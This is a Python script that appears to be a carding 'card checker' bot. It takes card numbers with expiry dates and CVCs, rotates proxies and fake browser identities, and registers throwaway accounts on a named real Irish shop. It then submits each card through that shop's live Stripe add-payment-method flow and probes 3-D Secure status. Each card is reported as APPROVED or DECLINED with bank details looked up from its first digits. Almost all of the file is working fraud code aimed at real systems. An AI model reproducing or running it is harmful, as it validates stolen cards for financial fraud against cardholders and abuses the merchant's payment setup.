import requests
import os
import re
import random
import string
import time
import json
from user_agent import generate_user_agent
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Headers for Stripe request
stripe_headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.6',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="142", "Brave";v="142", "Not_A Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
}

def get_rotating_user_agent():
    """Generate different types of user agents"""
    agents = [
        generate_user_agent(device_type='desktop'),
        generate_user_agent(device_type='desktop', os=('mac', 'linux')),
        generate_user_agent(device_type='desktop', os=('win',)),
        generate_user_agent(navigator='chrome'),
        generate_user_agent(navigator='firefox'),
    ]
    return random.choice(agents)

def generate_random_email():
    """Generate random email for each account"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + '@gmail.com'

def parse_proxy(proxy_str):
    """Parse proxy string into components"""
    if not proxy_str:
        return None
        
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, username, password = parts
        return {
            'http': f'http://{username}:{password}@{ip}:{port}',
            'https': f'http://{username}:{password}@{ip}:{port}'
        }
    elif len(parts) >= 2:
        ip, port = parts[0], parts[1]
        return {
            'http': f'http://{ip}:{port}',
            'https': f'http://{ip}:{port}'
        }
    else:
        return None

def load_proxies():
    """Load proxies from proxy.txt file"""
    if os.path.exists('proxy.txt'):
        with open('proxy.txt', 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        return proxies
    return []

def create_new_account(session, proxy_str):
    """Create a new account for each card with proxy"""
    try:
        proxies = parse_proxy(proxy_str)
        
        # Step 1: Get login nonce
        login_page_res = session.get('https://butcher.ie/my-account/', proxies=proxies, timeout=30)
        
        login_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', login_page_res.text)
        if not login_nonce_match:
            return False, "Failed to get login nonce"
        login_nonce = login_nonce_match.group(1)

        # Step 2: Register a new account with random email ONLY
        random_email = generate_random_email()
        
        register_data = {
            'email': random_email, 
            'woocommerce-register-nonce': login_nonce,
            '_wp_http_referer': '/my-account/', 
            'register': 'Register',
        }
        
        reg_response = session.post('https://butcher.ie/my-account/', data=register_data, proxies=proxies, timeout=30, allow_redirects=False)
        
        # Check if registration was successful
        if reg_response.status_code in [302, 303]:
            return True, "Account created"
        else:
            return True, "Account might be created"
            
    except Exception as e:
        return False, f"Account error: {str(e)}"

def get_payment_nonce(session, proxy_str):
    """Get payment nonce from the payment method page with proxy"""
    try:
        proxies = parse_proxy(proxy_str)
        
        payment_page_res = session.get('https://butcher.ie/my-account/add-payment-method/', proxies=proxies, timeout=30)
        payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', payment_page_res.text)
        if not payment_nonce_match:
            return None, "Failed to get payment nonce"
        
        ajax_nonce = payment_nonce_match.group(1)
        return ajax_nonce, "Success"
    except Exception as e:
        return None, f"Payment nonce error: {str(e)}"

def get_3ds_challenge_mandated(website_response, proxy_str):
    """Extract acsChallengeMandated value from 3DS authentication response with retry logic"""
    max_retries = 2
    for attempt in range(max_retries):
        try:
            # Check if website_response is a dictionary
            if not isinstance(website_response, dict) or not website_response.get('success'):
                return 'ACS_EXTRACTION_FAILED'
                
            data_section = website_response.get('data', {})
            if data_section.get('status') != 'requires_action':
                return 'ACS_EXTRACTION_FAILED'
                
            next_action = data_section.get('next_action', {})
            if next_action.get('type') == 'use_stripe_sdk':
                use_stripe_sdk = next_action.get('use_stripe_sdk', {})
                three_d_secure_2_source = use_stripe_sdk.get('three_d_secure_2_source')
                
                if three_d_secure_2_source:
                    time.sleep(0.5)
                    proxies = parse_proxy(proxy_str) if proxy_str else None
                    headers = stripe_headers.copy()
                    headers['user-agent'] = get_rotating_user_agent()
                    
                    auth_data = {
                        'source': three_d_secure_2_source,
                        'browser': '{"fingerprintAttempted":false,"fingerprintData":null,"challengeWindowSize":null,"threeDSCompInd":"Y","browserJavaEnabled":false,"browserJavascriptEnabled":true,"browserLanguage":"en-GB","browserColorDepth":"24","browserScreenHeight":"864","browserScreenWidth":"1536","browserTZ":"-330","browserUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"}',
                        'one_click_authn_device_support[hosted]': 'false',
                        'one_click_authn_device_support[same_origin_frame]': 'false',
                        'one_click_authn_device_support[spc_eligible]': 'true',
                        'one_click_authn_device_support[webauthn_eligible]': 'true',
                        'one_click_authn_device_support[publickey_credentials_get_allowed]': 'true',
                        'key': 'pk_live_51IbQ21ItrjNAxRL74KVowqSSvUFQsbInpdW3Nu9IJuNQ00B4cMJGlul12HjkQojXk3L5vvtbvrD4kfEYDvAfu3Nv00NOJyIwrd',
                        '_stripe_version': '2024-06-20'
                    }
                    
                    auth_response = requests.post(
                        'https://api.stripe.com/v1/3ds2/authenticate',
                        headers=headers,
                        data=auth_data,
                        proxies=proxies,
                        timeout=20,
                        verify=False
                    )
                    
                    if auth_response.status_code == 200:
                        auth_data_response = auth_response.json()
                        ares = auth_data_response.get('ares', {})
                        acs_challenge = ares.get('acsChallengeMandated', 'ACS_EXTRACTION_FAILED')
                        
                        if acs_challenge in ['Y', 'N']:
                            return acs_challenge
                        else:
                            return 'ACS_EXTRACTION_FAILED'
            
            return 'ACS_EXTRACTION_FAILED'
            
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.HTTPError) as e:
            if attempt < max_retries - 1:
                time.sleep(1)
                continue
            else:
                return 'ACS_EXTRACTION_FAILED'
        except Exception as e:
            return 'ACS_EXTRACTION_FAILED'
    
    return 'ACS_EXTRACTION_FAILED'

def extract_error_from_response(response_text):
    """Extract error message from response text using regex patterns"""
    try:
        # Try to parse as JSON first
        if response_text.strip():
            try:
                data = json.loads(response_text)
                if isinstance(data, dict):
                    # Check for Stripe error format
                    if 'error' in data:
                        error_msg = data['error'].get('message', '')
                        if error_msg:
                            return error_msg
                    
                    # Check for WordPress/WooCommerce error format
                    if 'data' in data and 'error' in data['data']:
                        error_msg = data['data']['error'].get('message', '')
                        if error_msg:
                            return error_msg
                    
                    # Check for message field
                    if 'message' in data:
                        return data['message']
            except:
                pass
        
        # If JSON parsing fails, try regex patterns
        patterns = [
            r'"message"\s*:\s*"([^"]+)"',
            r'"error"\s*:\s*{[^}]*"message"\s*:\s*"([^"]+)"',
            r'error\s*:\s*"([^"]+)"',
            r'decline[^"]*"([^"]+)"',
            r'declined[^"]*"([^"]+)"',
            r'incorrect[^"]*"([^"]+)"',
            r'invalid[^"]*"([^"]+)"',
            r'expired[^"]*"([^"]+)"',
            r'cvc[^"]*"([^"]+)"',
            r'security[^"]*"([^"]+)"',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                error_msg = match.group(1)
                # Clean up the error message
                error_msg = error_msg.replace('\\"', '"').replace('\\/', '/')
                return error_msg
        
        # Check for common error patterns in text
        error_indicators = [
            ('declined', 'Your card was declined.'),
            ('insufficient', 'Your card has insufficient funds.'),
            ('expired', 'Your card has expired.'),
            ('invalid', 'Your card number is invalid.'),
            ('cvc', 'Your card\'s security code is incorrect.'),
            ('security', 'Your card\'s security code is incorrect.'),
            ('incorrect_cvc', 'Your card\'s security code is incorrect.'),
            ('incorrect zip', 'Your zip code is incorrect.'),
            ('do_not_honor', 'Your card was declined.'),
            ('pickup_card', 'Your card has been reported lost or stolen.'),
            ('restricted_card', 'Your card is restricted.'),
            ('card_not_supported', 'Your card is not supported.'),
            ('generic_decline', 'Your card was declined.'),
            ('transaction_not_allowed', 'Transaction not allowed.'),
        ]
        
        response_lower = response_text.lower()
        for indicator, message in error_indicators:
            if indicator in response_lower:
                return message
        
        return "Card declined."
        
    except Exception as e:
        return "Card declined."

def get_final_message(website_response, proxy_str, raw_response_text=""):
    """Extract final user-friendly message from response with 3DS info"""
    try:
        # Check if website_response is a dictionary
        if not isinstance(website_response, dict):
            # Try to extract error from raw response text
            if raw_response_text:
                return extract_error_from_response(raw_response_text)
            return "Card declined."
            
        if website_response.get('success'):
            data_section = website_response.get('data', {})
            status = data_section.get('status', '')
            
            if status == 'succeeded':
                return "Payment method successfully added."
            elif status == 'requires_action':
                acs_challenge_mandated = get_3ds_challenge_mandated(website_response, proxy_str)
                
                error_message = ""
                if 'error' in data_section:
                    error_msg = data_section['error'].get('message', '')
                    if 'unable to authenticate your payment method' in error_msg.lower():
                        error_message = " | Auth Failed: Unable to authenticate payment method"
                
                if acs_challenge_mandated == 'Y':
                    return f"3D Secure verification required. | ACS Challenge: ✅ Y{error_message}"
                elif acs_challenge_mandated == 'N':
                    return f"3D Secure verification required. | ACS Challenge: ❌ N{error_message}"
                else:
                    return f"3D Secure verification required. | ACS Challenge: {acs_challenge_mandated}{error_message}"
            else:
                return "Payment method status unknown."
        else:
            # Extract error message
            error_data = website_response.get('data', {})
            if 'error' in error_data:
                error_msg = error_data['error'].get('message', '')
                if error_msg:
                    # Clean and format common error messages
                    error_lower = error_msg.lower()
                    
                    if 'cvc' in error_lower or 'security code' in error_lower:
                        return "Your card's security code is incorrect."
                    elif 'declined' in error_lower:
                        return "Your card was declined."
                    elif 'insufficient' in error_lower:
                        return "Your card has insufficient funds."
                    elif 'expired' in error_lower:
                        return "Your card has expired."
                    elif 'unable to authenticate your payment method' in error_lower:
                        return "We are unable to authenticate your payment method. Please choose a different payment method and try again."
                    elif 'incorrect' in error_lower:
                        return "Your card information is incorrect."
                    elif 'invalid' in error_lower:
                        return "Your card number is invalid."
                    elif 'do_not_honor' in error_lower:
                        return "Your card was declined by the bank."
                    elif 'pickup_card' in error_lower:
                        return "Your card has been reported lost or stolen."
                    elif 'restricted_card' in error_lower:
                        return "Your card is restricted."
                    elif 'card_not_supported' in error_lower:
                        return "Your card is not supported."
                    elif 'transaction_not_allowed' in error_lower:
                        return "Transaction not allowed with this card."
                    else:
                        # Return the exact error message
                        return error_msg
            
            # If no error in structure, try to extract from raw response
            if raw_response_text:
                return extract_error_from_response(raw_response_text)
                
            return "Card declined."
    except:
        return "Card declined."

# BIN lookup function
def get_bin_info(card_number):
    """Get BIN information using binlist.net API"""
    if not card_number or len(card_number) < 6:
        return {
            'bank': 'Unavailable',
            'country': 'Unknown',
            'brand': 'Unknown',
            'type': 'Unknown',
            'level': 'Unknown',
            'emoji': '🏳️'
        }
    
    clean_card = ''.join(filter(str.isdigit, card_number))
    bin_code = clean_card[:6]
    
    try:
        time.sleep(0.2)
        
        headers = {
            'Host': 'lookup.binlist.net',
            'Cookie': '_ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        api_url = f"https://lookup.binlist.net/{bin_code}"
        response = requests.get(api_url, headers=headers, timeout=10, verify=False)
        
        if response.status_code == 200:
            try:
                data = response.json()
                
                bank_name = data.get('bank', {}).get('name', 'Unavailable')
                country_name = data.get('country', {}).get('name', 'Unknown')
                country_code = data.get('country', {}).get('alpha2', '')
                brand = data.get('scheme', 'Unknown')
                
                card_type = data.get('type', '')
                if not card_type:
                    response_text = response.text
                    if '"type":"credit"' in response_text:
                        card_type = 'Credit'
                    elif '"type":"debit"' in response_text:
                        card_type = 'Debit'
                    else:
                        card_type = 'Unknown'
                
                emoji = get_country_emoji(country_code)
                
                return {
                    'bank': bank_name,
                    'country': country_name,
                    'brand': brand,
                    'type': card_type,
                    'level': brand,
                    'emoji': emoji
                }
                
            except:
                response_text = response.text
                
                bank_match = re.search(r'"name"\s*:\s*"([^"]+)"', response_text)
                bank_name = bank_match.group(1) if bank_match else 'Unavailable'
                
                country_match = re.search(r'"country".*?"name"\s*:\s*"([^"]+)"', response_text)
                country_name = country_match.group(1) if country_match else 'Unknown'
                
                code_match = re.search(r'"alpha2"\s*:\s*"([^"]+)"', response_text)
                country_code = code_match.group(1) if code_match else ''
                
                scheme_match = re.search(r'"scheme"\s*:\s*"([^"]+)"', response_text)
                brand = scheme_match.group(1) if scheme_match else 'Unknown'
                
                card_type = 'Unknown'
                if '"type":"credit"' in response_text:
                    card_type = 'Credit'
                elif '"type":"debit"' in response_text:
                    card_type = 'Debit'
                
                emoji = get_country_emoji(country_code)
                
                return {
                    'bank': bank_name,
                    'country': country_name,
                    'brand': brand,
                    'type': card_type,
                    'level': brand,
                    'emoji': emoji
                }
        else:
            return {
                'bank': 'Unavailable',
                'country': 'Unknown',
                'brand': 'Unknown',
                'type': 'Unknown',
                'level': 'Unknown',
                'emoji': '🏳️'
            }
            
    except Exception as e:
        return {
            'bank': 'Unavailable',
            'country': 'Unknown',
            'brand': 'Unknown',
            'type': 'Unknown',
            'level': 'Unknown',
            'emoji': '🏳️'
        }

def get_country_emoji(country_code):
    """Convert country code to emoji"""
    if not country_code or len(country_code) != 2:
        return '🏳️'
    
    try:
        country_code = country_code.upper()
        return ''.join(chr(127397 + ord(char)) for char in country_code)
    except:
        return '🏳️'
        
def check_card_stripe(cc_line):
    """Main function to check card via Stripe (single card)"""
    start_time = time.time()
    
    try:
        # Parse CC
        n, mm, yy, cvc = cc_line.strip().split('|')
        if not yy.startswith('20'):
            yy = '20' + yy
        
        # Load proxies
        proxies_list = load_proxies()
        if not proxies_list:
            return "❌ No proxies available"
        
        # Use random proxy
        proxy_str = random.choice(proxies_list)
        
        session = requests.Session()
        session.headers.update({
            'user-agent': get_rotating_user_agent()
        })

        if len(yy) == 4:
            yy_stripe = yy[-2:]
        else:
            yy_stripe = yy

        # Create a NEW account for this card
        account_created, account_msg = create_new_account(session, proxy_str)
        if not account_created:
            elapsed_time = time.time() - start_time
            bin_info = get_bin_info(n)
            return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Account creation failed
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

        # Get payment nonce
        ajax_nonce, nonce_msg = get_payment_nonce(session, proxy_str)
        if not ajax_nonce:
            elapsed_time = time.time() - start_time
            bin_info = get_bin_info(n)
            return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Payment nonce failed
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

        # Prepare Stripe data with the current card
        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_stripe}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=IN&pasted_fields=number&payment_user_agent=stripe.js%2F5b3d231411%3B+stripe-js-v3%2F5b3d231411%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fbutcher.ie&time_on_page=143687&client_attribution_metadata[client_session_id]=4cd78425-de5d-4d48-bc3a-a24df2b85f9c&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=7888070f-9538-4305-90d9-08e3cf2ef0c7&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=72eb34df-440a-4b37-b0b1-eb1ad548a7eb3c34e3&muid=8d8ff28f-32e1-4581-9f28-a47eb2a745000595b7&sid=25756093-205d-4b72-900b-7decd5ab8fffccacc6&key=pk_live_51IbQ21ItrjNAxRL74KVowqSSvUFQsbInpdW3Nu9IJuNQ00B4cMJGlul12HjkQojXk3L5vvtbvrD4kfEYDvAfu3Nv00NOJyIwrd&_stripe_version=2024-06-20'

        proxies = parse_proxy(proxy_str)
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=data, proxies=proxies, timeout=30)

        # Check if response has 'id' before extracting
        response_data = response.json()
        
        if 'id' in response_data:
            pm_id = response_data['id']
            
            # Second request (admin ajax)
            headers2 = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://butcher.ie',
                'priority': 'u=1, i',
                'referer': 'https://butcher.ie/my-account/add-payment-method/',
                'sec-ch-ua': '"Chromium";v="142", "Brave";v="142", "Not_A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': get_rotating_user_agent(),
                'x-requested-with': 'XMLHttpRequest',
            }

            data2 = {
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': pm_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': ajax_nonce,
            }

            response2 = session.post('https://butcher.ie/wp-admin/admin-ajax.php', headers=headers2, data=data2, proxies=proxies, timeout=30)
            
            # Save raw response text for error extraction
            raw_response_text = response2.text
            
            # Handle different response types
            website_response = {}
            try:
                if raw_response_text.strip():
                    website_response = response2.json()
                    
                    # If response is an integer (like 0 or 1), convert it to a proper dict
                    if isinstance(website_response, (int, float)):
                        website_response = {
                            'success': bool(website_response),
                            'data': {'error': {'message': extract_error_from_response(raw_response_text)}}
                        }
            except Exception as json_error:
                # If JSON parsing fails, create a response with extracted error
                error_msg = extract_error_from_response(raw_response_text)
                website_response = {
                    'success': False,
                    'data': {'error': {'message': error_msg}}
                }
            
            # Get final message with 3DS info and raw response text
            final_message = get_final_message(website_response, proxy_str, raw_response_text)
            
            elapsed_time = time.time() - start_time
            bin_info = get_bin_info(n)
            
            # Check the actual status from the response
            if isinstance(website_response, dict) and website_response.get('success'):
                data_section = website_response.get('data', {})
                status = data_section.get('status', '')
                
                if status == 'succeeded':
                    return f"""
APPROVED CC ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                elif status == 'requires_action':
                    return f"""
APPROVED CC ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                else:
                    return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝗻𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            else:
                # Check for specific error messages that should be treated as APPROVED
                error_data = website_response.get('data', {}) if isinstance(website_response, dict) else {}
                error_msg = error_data.get('error', {}).get('message', '').lower() if 'error' in error_data else ''
                
                # Treat these errors as APPROVED
                if any(term in error_msg for term in ['cvc', 'security code', 'incorrect_cvc']):
                    return f"""
APPROVED CCN ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                
                return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                
        else:
            elapsed_time = time.time() - start_time
            bin_info = get_bin_info(n)
            return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Stripe validation failed
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

    except Exception as e:
        elapsed_time = time.time() - start_time
        try:
            n = cc_line.strip().split('|')[0]
            bin_info = get_bin_info(n)
        except:
            bin_info = {
                'bank': 'Unavailable',
                'country': 'Unknown',
                'brand': 'Unknown',
                'type': 'Unknown',
                'level': 'Unknown',
                'emoji': '🏳️'
            }
        return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Request failed: {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

def check_cards_stripe(cc_lines):
    """Mass check function for multiple cards"""
    results = []
    for cc_line in cc_lines:
        result = check_card_stripe(cc_line)
        results.append(result)
        time.sleep(2)  # Delay between checks
    return results

# For standalone testing
if __name__ == "__main__":
    # Test with a single card
    test_cc = "4111111111111111|12|2025|123"
    print("Testing Stripe checker...")
    result = check_card_stripe(test_cc)
    print(result)
